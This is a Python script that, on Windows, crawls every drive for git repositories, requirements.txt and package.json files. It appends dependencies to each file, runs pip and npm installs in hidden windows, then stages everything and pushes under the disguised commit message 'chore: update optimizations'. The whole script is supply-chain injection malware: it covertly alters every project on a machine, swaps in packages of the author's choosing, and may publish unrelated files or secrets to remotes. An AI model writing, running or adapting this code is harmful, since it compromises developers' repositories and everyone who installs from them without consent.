import os
import sys
import json
import subprocess
import time
from pathlib import Path

EXCLUDED_NAMES = {
    'program8x', 'node_modules', '__pycache__', '.env', 'dist', 'build',
    '$Recycle.Bin', 'System Volume Information', 'Recovery', 'ProgramData',
    'Program Files', 'Program Files (x86)', 'Windows', 'AppData', 'PerfLogs'
}
EXCLUDED_PATTERNS = ['.DS_Store', 'Thumbs.db']
COMMIT_MESSAGE = 'chore: update optimizations'
JS_LIBS = ['zod']
PY_LIBS = ['django'] 

LOG_FILE = Path(os.environ.get('TEMP', '')) / 'injector_log.txt'

def log(msg):
    """Append timestamped message to log file."""
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {msg}\n")
    except:
        pass

def run_hidden(cmd, cwd=None, wait=True):
    """Run a command with no visible window."""
    creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
    try:
        if wait:
            subprocess.run(cmd, cwd=cwd, creationflags=creationflags,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
        else:
            subprocess.Popen(cmd, cwd=cwd, creationflags=creationflags,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
    except Exception as e:
        log(f"run_hidden error: {e}")

def get_available_drives():
    """Return list of available drive roots (e.g., ['C:\\', 'D:\\'])."""
    drives = []
    for letter in range(67, 91):
        drive = f"{chr(letter)}:\\"
        if os.path.exists(drive):
            drives.append(drive)
    return drives if drives else ['C:\\']

def is_excluded(path):
    """Check if a path or its name should be excluded."""
    name = os.path.basename(path)
    if name in EXCLUDED_NAMES:
        return True
    for pattern in EXCLUDED_PATTERNS:
        if pattern in path:
            return True
    return False

def append_to_requirements(req_path, libs):
    """Append libraries to requirements.txt (each on new line)."""
    try:
        with open(req_path, 'a', encoding='utf-8') as f:
            for lib in libs:
                f.write(f"{lib}\n")
        log(f"Added {libs} to {req_path}")
    except Exception as e:
        log(f"Failed to append to {req_path}: {e}")

def add_to_package_json(pkg_path, libs, version='*'):
    """Add libraries to dependencies in package.json."""
    try:
        with open(pkg_path, 'r', encoding='utf-8') as f:
            pkg = json.load(f)
        if 'dependencies' not in pkg:
            pkg['dependencies'] = {}
        for lib in libs:
            pkg['dependencies'][lib] = version
        with open(pkg_path, 'w', encoding='utf-8') as f:
            json.dump(pkg, f, indent=2)
        log(f"Added {libs} to {pkg_path}")
    except Exception as e:
        log(f"Failed to update {pkg_path}: {e}")

def git_add_commit_push(repo_root):
    """Run git add . , commit, push inside repo_root. Silently skip if nothing to commit or no remote."""
    result_summary = {
        'repo': repo_root,
        'commit': 'skipped',
        'push': 'skipped',
        'message': ''
    }

    run_hidden(['git', 'add', '.'], cwd=repo_root, wait=True)

    result = subprocess.run(['git', 'commit', '-m', COMMIT_MESSAGE],
                            cwd=repo_root, capture_output=True, text=True,
                            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0)
    if result.returncode != 0:
        if 'nothing to commit' in result.stderr or 'no changes added' in result.stderr:
            log(f"No changes to commit in {repo_root}")
            result_summary['commit'] = 'no_changes'
            return result_summary
        else:
            log(f"Commit failed in {repo_root}: {result.stderr.strip()}")
            result_summary['commit'] = 'failed'
            result_summary['message'] = result.stderr.strip()
            return result_summary

    result_summary['commit'] = 'success'

    result = subprocess.run(['git', 'push'], cwd=repo_root, capture_output=True, text=True,
                            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0)
    if result.returncode != 0:
        if 'No configured push destination' in result.stderr or 'fatal:' in result.stderr:
            log(f"No remote configured in {repo_root}, skipping push")
            result_summary['push'] = 'no_remote'
        else:
            log(f"Push failed in {repo_root}: {result.stderr.strip()}")
            result_summary['push'] = 'failed'
            result_summary['message'] = result.stderr.strip()
    else:
        log(f"Successfully committed and pushed changes in {repo_root}")
        result_summary['push'] = 'success'

    return result_summary

def scan_and_inject(scan_roots=None):
    """Main routine: scan roots, inject libraries, commit+push, and return a summary."""
    roots = scan_roots if scan_roots is not None else get_available_drives()
    log(f"Scanning roots: {roots}")

    git_roots = set()
    requirements_paths = []
    package_json_paths = []

    for scan_root in roots:
        log(f"Walking {scan_root}")
        for root, dirs, files in os.walk(scan_root):
            dirs[:] = [d for d in dirs if d not in EXCLUDED_NAMES and not is_excluded(os.path.join(root, d))]
            if is_excluded(root):
                continue

            if '.git' in dirs:
                git_roots.add(root)
                
            for file in files:
                if file == 'requirements.txt':
                    requirements_paths.append(os.path.join(root, file))
                elif file == 'package.json':
                    package_json_paths.append(os.path.join(root, file))

    log(f"Found {len(git_roots)} git repos")
    log(f"Found {len(requirements_paths)} requirements.txt files")
    log(f"Found {len(package_json_paths)} package.json files")

    summary = {
        'scan_roots': roots,
        'git_repo_count': len(git_roots),
        'requirements_count': len(requirements_paths),
        'package_json_count': len(package_json_paths),
        'requirements_files': list(requirements_paths),
        'package_json_files': list(package_json_paths),
        'git_results': []
    }

    for req in requirements_paths:
        log(f"Processing {req}")
        append_to_requirements(req, PY_LIBS)
        run_hidden(['python', '-m', 'pip', 'install', '-r', req], cwd=os.path.dirname(req), wait=True)

    for pkg in package_json_paths:
        log(f"Processing {pkg}")
        add_to_package_json(pkg, JS_LIBS)
        run_hidden(['npm', 'install', '--ignore-scripts'], cwd=os.path.dirname(pkg), wait=True)

    for repo in git_roots:
        log(f"Processing git repo {repo}")
        summary['git_results'].append(git_add_commit_push(repo))

    log("Scan and inject completed.")
    return summary

if __name__ == '__main__':
    if sys.platform != 'win32':
        sys.exit(0)
    scan_and_inject()